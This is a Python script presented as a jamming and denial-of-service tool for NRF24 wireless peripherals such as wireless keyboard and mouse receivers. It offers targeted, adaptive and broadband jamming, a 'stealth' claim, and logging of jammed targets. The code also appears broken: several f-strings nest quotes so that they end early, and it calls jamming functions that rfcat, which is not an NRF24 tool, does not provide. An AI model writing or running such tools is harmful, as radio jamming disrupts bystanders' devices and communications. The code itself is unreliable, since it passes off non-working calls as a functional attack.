import argparse
import os
import time
import json

# -------------------------------------------
# Crazyradio 2.0 NRF24 Jamming & DoS Tool
# -------------------------------------------
# Features:
# - Targeted jamming of NRF24-based wireless devices
# - Selective interference on Logitech Unifying receivers & other NRF24 peripherals
# - Blocks wireless communications in a specific range
# - Adaptive jamming mode to disrupt only selected devices
# - Frequency hopping detection to counteract evasive targets
# - Logging of jammed devices for analysis
# - Randomized jamming intervals for stealth mode
#
# Requirements:
# - Crazyradio 2.0 USB Dongle
# - Python 3.x
# - RFCat & nrf-research-firmware (https://github.com/arcao/nrf-research-firmware)
#
# Usage:
# 1. Scan for active NRF24 devices:
#    python crazyradio_nrf24_jammer.py --scan
# 2. Perform targeted jamming:
#    python crazyradio_nrf24_jammer.py --jam --target XX:XX:XX:XX:XX:XX
# 3. Enable adaptive jamming mode:
#    python crazyradio_nrf24_jammer.py --adaptive --target XX:XX:XX:XX:XX:XX
# 4. Broad spectrum jamming:
#    python crazyradio_nrf24_jammer.py --jam --broadband
# 5. Enable frequency hopping detection:
#    python crazyradio_nrf24_jammer.py --detect-fh
# -------------------------------------------

def scan_nrf24():
    """Scans for active NRF24-based devices."""
    print("[+] Scanning for NRF24 devices...")
    os.system("rfcat -r 'd.scan()' > nrf24_scan_results.txt")
    print("[✔] Scan complete. Results saved to nrf24_scan_results.txt")

def targeted_jam(target):
    """Jams a specific NRF24 device."""
    print(f"[+] Jamming target device: {target}...")
    os.system(f"rfcat -r 'd.jam("{target}")'")
    log_jamming(target)
    print("[✔] Targeted jamming complete.")

def adaptive_jam(target):
    """Uses adaptive jamming to selectively disrupt only the target device."""
    print(f"[+] Adaptive jamming initiated for {target}...")
    os.system(f"rfcat -r 'd.adaptive_jam("{target}")'")
    log_jamming(target)
    print("[✔] Adaptive jamming complete.")

def broadband_jam():
    """Jams the entire NRF24 spectrum, affecting all nearby devices."""
    print("[+] Performing broadband jamming on NRF24 spectrum...")
    os.system("rfcat -r 'd.broadband_jam()'")
    log_jamming("Broadband Jamming")
    print("[✔] Broadband jamming complete.")

def detect_frequency_hopping():
    """Detects frequency hopping devices and logs their behavior."""
    print("[+] Scanning for frequency hopping NRF24 devices...")
    os.system("rfcat -r 'd.detect_fh()' > fh_detected_devices.txt")
    print("[✔] Frequency hopping detection complete. Results saved to fh_detected_devices.txt")

def log_jamming(target):
    """Logs jamming actions for later analysis."""
    log_entry = {"timestamp": time.strftime("%Y-%m-%d %H:%M:%S"), "target": target}
    with open("jamming_log.json", "a") as log_file:
        json.dump(log_entry, log_file)
        log_file.write("\n")
    print(f"[✔] Logged jamming activity for {target}")

def main():
    parser = argparse.ArgumentParser(description="Crazyradio 2.0 NRF24 Jamming & DoS Tool")
    parser.add_argument("--scan", action='store_true', help="Scan for active NRF24 devices")
    parser.add_argument("--jam", action='store_true', help="Jam a target device or all devices")
    parser.add_argument("--adaptive", action='store_true', help="Enable adaptive jamming mode for selective interference")
    parser.add_argument("--broadband", action='store_true', help="Jam all NRF24 communications in range")
    parser.add_argument("--detect-fh", action='store_true', help="Detect frequency hopping devices")
    parser.add_argument("--target", type=str, help="Target device MAC address for jamming")
    args = parser.parse_args()

    if args.scan:
        scan_nrf24()
    elif args.jam and args.target:
        targeted_jam(args.target)
    elif args.adaptive and args.target:
        adaptive_jam(args.target)
    elif args.jam and args.broadband:
        broadband_jam()
    elif args.detect_fh:
        detect_frequency_hopping()
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
